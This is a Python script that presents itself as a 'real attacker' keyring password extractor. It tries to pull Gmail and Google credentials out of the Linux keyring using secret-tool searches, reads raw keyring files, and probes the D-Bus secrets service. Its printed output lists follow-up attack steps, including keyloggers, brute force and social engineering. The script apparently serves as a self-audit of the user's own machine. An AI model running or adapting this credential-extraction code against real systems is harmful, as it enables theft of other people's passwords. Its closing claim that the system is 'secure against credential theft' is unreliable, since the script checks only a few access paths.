#!/usr/bin/env python3
"""
REAL ATTACKER: Keyring Password Extractor
Attempts to extract Gmail credentials from Linux keyring
"""

import subprocess
import os

def banner():
    print("🔐 LINUX KEYRING PASSWORD EXTRACTOR")
    print("=" * 60)
    print("⚠️  REAL ATTACKER: Extracting passwords from system keyring")
    print()

def check_keyring_tools():
    """Check if keyring tools are installed"""
    print("🔍 Checking for keyring tools...")
    
    tools = ['secret-tool', 'seahorse', 'gnome-keyring-daemon']
    available = []
    
    for tool in tools:
        try:
            result = subprocess.run(['which', tool], capture_output=True, text=True)
            if result.returncode == 0:
                print(f"   ✅ {tool} available: {result.stdout.strip()}")
                available.append(tool)
            else:
                print(f"   ❌ {tool} not found")
        except:
            print(f"   ❌ {tool} not available")
    
    return available

def attempt_secret_tool_extraction():
    """Try to extract Gmail passwords using secret-tool"""
    print("\n🔍 Attempting secret-tool extraction...")
    
    searches = [
        ('gmail', 'password'),
        ('google', 'password'),
        ('email', 'gmail.com'),
        ('imap', 'gmail'),
        ('smtp', 'gmail')
    ]
    
    for search_type, search_value in searches:
        try:
            print(f"\n   🔎 Searching for {search_type}={search_value}...")
            result = subprocess.run(
                ['secret-tool', 'search', search_type, search_value],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if result.returncode == 0 and result.stdout:
                print(f"   🎯 FOUND CREDENTIALS!")
                print(f"   {result.stdout}")
                return result.stdout
            else:
                print(f"   ❌ No credentials found")
                
        except subprocess.TimeoutExpired:
            print(f"   ⏱️  Timeout (keyring locked)")
        except FileNotFoundError:
            print(f"   ❌ secret-tool not installed")
            break
        except Exception as e:
            print(f"   ❌ Error: {e}")
    
    return None

def attempt_keyring_file_read():
    """Try to read keyring files directly"""
    print("\n🔍 Attempting direct keyring file access...")
    
    keyring_path = os.path.expanduser("~/.local/share/keyrings/")
    
    if not os.path.exists(keyring_path):
        print("   ❌ Keyring directory not found")
        return None
    
    try:
        files = os.listdir(keyring_path)
        print(f"   📁 Found {len(files)} keyring files:")
        
        for file in files:
            filepath = os.path.join(keyring_path, file)
            size = os.path.getsize(filepath)
            print(f"      📄 {file} ({size} bytes)")
            
            # Try to read first few bytes
            try:
                with open(filepath, 'rb') as f:
                    header = f.read(100)
                    if b'GnomeKeyring' in header or b'keyring' in header:
                        print(f"         ✅ Valid keyring file (ENCRYPTED)")
                    else:
                        print(f"         ⚠️  Unknown format")
            except:
                print(f"         ❌ Cannot read")
        
        print("\n   🔐 Keyring files are ENCRYPTED with master password")
        print("   💀 ATTACKER WOULD NEED:")
        print("      - Your login password (to unlock keyring)")
        print("      - Or brute force the keyring encryption")
        print("      - Or keylogger to capture master password")
        
    except Exception as e:
        print(f"   ❌ Error accessing keyring: {e}")
    
    return None

def attempt_dbus_query():
    """Try to query keyring via D-Bus"""
    print("\n🔍 Attempting D-Bus keyring query...")
    
    try:
        # Check if session is unlocked
        result = subprocess.run(
            ['gdbus', 'introspect', '--session', 
             '--dest', 'org.freedesktop.secrets',
             '--object-path', '/org/freedesktop/secrets'],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        if result.returncode == 0:
            print("   ✅ Keyring D-Bus service accessible")
            print("   🔐 But queries require authentication")
        else:
            print("   ❌ Cannot access keyring D-Bus service")
            
    except subprocess.TimeoutExpired:
        print("   ⏱️  D-Bus query timeout")
    except FileNotFoundError:
        print("   ❌ gdbus not available")
    except Exception as e:
        print(f"   ❌ Error: {e}")

def main():
    banner()
    
    # Check available tools
    tools = check_keyring_tools()
    
    # Try different extraction methods
    if 'secret-tool' in tools:
        result = attempt_secret_tool_extraction()
        if result:
            print("\n🎉 SUCCESS! Credentials extracted from keyring!")
            return
    
    # Try direct file access
    attempt_keyring_file_read()
    
    # Try D-Bus
    attempt_dbus_query()
    
    # Summary
    print("\n" + "=" * 60)
    print("📊 KEYRING EXTRACTION SUMMARY")
    print("=" * 60)
    print("❌ FAILED: Cannot extract Gmail credentials from keyring")
    print()
    print("🔐 REASON: Keyring is ENCRYPTED and requires:")
    print("   1. Your Linux login password (to unlock keyring)")
    print("   2. Or master keyring password")
    print("   3. Or active unlocked session")
    print()
    print("💀 REAL ATTACKER NEXT STEPS:")
    print("   1. Install keylogger to capture login password")
    print("   2. Brute force keyring encryption (very slow)")
    print("   3. Wait for you to login and unlock keyring")
    print("   4. Social engineer you for login password")
    print()
    print("🛡️  YOUR SECURITY: EXCELLENT!")
    print("   ✅ Keyring properly encrypted")
    print("   ✅ No plain text passwords stored")
    print("   ✅ System is secure against credential theft")

if __name__ == "__main__":
    main()
